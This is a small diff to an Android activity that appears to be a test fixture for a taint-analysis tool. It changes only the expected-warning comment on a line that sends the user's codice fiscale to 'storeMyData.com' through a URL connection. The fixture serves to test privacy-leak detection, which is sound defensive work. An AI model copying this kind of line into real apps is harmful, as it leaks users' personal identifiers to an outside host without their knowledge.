@@ -11,7 +11,7 @@ public class SecondActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.second_activity);
         try {
-            new URL("http://www.storeMyData.com/?CF=" + getCodiceFiscale()).openConnection(); //WARNING//PrivacyAndroid: taintedness is flowing into the Log method.
+            new URL("http://www.storeMyData.com/?CF=" + getCodiceFiscale()).openConnection(); //WARNING//Intents,Injection: taintedness is flowing into the Log method.
         }
         catch (IOException e) {
             e.printStackTrace();
